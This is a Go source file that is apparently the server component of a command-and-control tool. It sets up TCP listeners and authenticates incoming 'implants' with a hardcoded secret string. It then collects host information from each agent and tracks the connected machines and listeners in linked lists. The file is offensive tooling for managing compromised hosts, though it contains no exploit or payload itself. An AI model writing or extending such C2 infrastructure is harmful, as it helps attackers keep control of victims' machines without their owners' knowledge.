package main

import (
	"fmt"
	"net"
	"strings"
)

func makeListener(port string) (bool, net.Listener) {
	addr := ":" + port
	addr = strings.TrimSuffix(addr, "\n") //Ntibihla haydeh ktiir mi2ziyeh
	tcpAddr, err := net.ResolveTCPAddr("tcp4", addr)
	if err != nil {
		return false, nil
	}
	tcpListen, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		return false, nil
	}
	return true, tcpListen
}

func handleClient(conn net.Conn, lListeners *listenerList, port string) {
	auth := make([]byte, 32)
	read_len, err := conn.Read(auth)
	// if read_len < 1 { //Khafif code
	// 	fmt.Println("Auth Failed. Bytes < 1")
	// 	return
	// }
	if err != nil {
		fmt.Println("Something went wrong reading from the connection")
		return
	}
	authString := string(auth[:read_len])
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("Implant failed to authenticate")
		return
	}
	fmt.Println("Agent Autehnticated Succesfully !")
	status := "CONNECTED"
	lListeners.updateConnListener2(conn, port, status)
}

// chan <-          writing to channel (output channel)
// <- chan          reading from channel (input channel)
// chan             read from or write to channel (input/output channel)
func listen2(tcpListen net.Listener, c chan<- net.Conn, lList *listenerList) {
	conn, err := tcpListen.Accept()
	if err != nil {
		fmt.Println("Error Accpeting Connection")
		return
	}
	//defer conn.Close()
	auth := make([]byte, 32)
	read_len, err := conn.Read(auth)
	if read_len < 1 {
		fmt.Println("Auth Failed. Bytes < 1")
		return
	}
	if err != nil {
		fmt.Println("Something went wrong reading from the connection")
		return
	}
	authString := string(auth[:read_len])
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("Implant failed to authenticate")
		return
	}
	fmt.Println("Agent Autehnticated Succesfully !")
	lList.updateConnListener(conn, tcpListen)
	c <- conn
}

func (list *clientList) registerClient2(c <-chan net.Conn /*, cErr <-chan string*/) {
	connection := <-c
	if connection == nil {
		fmt.Println("Couldnt Establish Connection")
		return
	}
	connection.Write([]byte("Hostinfo\n"))
	request := make([]byte, 128)
	read_len, err := connection.Read(request)
	if read_len < 1 {
		fmt.Println("Auth Failed. Bytes < 1")
		return
	}
	if err != nil {
		fmt.Println("Something went wrong reading from the connection")
		return
	}
	hostInfo := string(request[:read_len])
	newNode := &Client{name: hostInfo, ID: 123, state: "UP", conn: connection}
	if list.head == nil {
		list.head = newNode
	} else {
		current := list.head
		for current.next != nil {
			current = current.next
		}
		current.next = newNode
	}
}

func (list *clientList) displayClient() {
	current := list.head

	if current == nil {
		fmt.Println("Client list is empty")
		return
	}
	//fmt.Print("Linked list: ")
	for current != nil {
		fmt.Println(current.name)
		current = current.next
	}
}

func (list *listenerList) registerListener(port string, listen net.Listener) {
	lista := listen
	newListener := &Listener{port: port, listener: lista, status: "Listening"}
	if list.head == nil {
		list.head = newListener
	} else {
		current := list.head
		for current.next != nil {
			current = current.next
		}
		current.next = newListener
	}
}

func (list *listenerList) displayListeners() {
	current := list.head
	if current == nil {
		fmt.Println("List is empty")
		return
	}
	for current != nil {
		fmt.Println(current.port)
		current = current.next
	}
}

func (list *listenerList) updateConnListener(conn net.Conn, targetListener net.Listener) {
	current := list.head
	if current == nil {
		fmt.Println("List is empty")
		return
	}
	for current.listener != targetListener {
		current = current.next
	}
	current.conn = conn
}

func (list *listenerList) updateConnListener2(conn net.Conn, targetPort string, stat string) {
	current := list.head
	if current == nil {
		fmt.Println("List is empty")
		return
	}
	for current.port != targetPort {
		current = current.next
	}
	current.conn = conn
	current.status = stat

}

func (list *listenerList) delListener(port string) {
	port = strings.TrimSuffix(port, "\n")
	if list.head == nil {
		fmt.Println("Listener list is empty")
		return
	}

	// If the node to be removed is the head
	if list.head.port == port {
		list.head = list.head.next
		return
	}

	// Find the node before the one to be removed
	prev := list.head
	for prev.next != nil && prev.next.port != port {
		prev = prev.next
	}

	// If the node with the given port is not found
	if prev.next == nil {
		fmt.Println("Listener with port", port, "not found")
		return
	}

	// Remove the node and close the listener

	defer prev.next.conn.Write([]byte("Bye Bye"))
	defer prev.next.conn.Close()
	defer prev.next.listener.Close()
	prev.next = prev.next.next
}
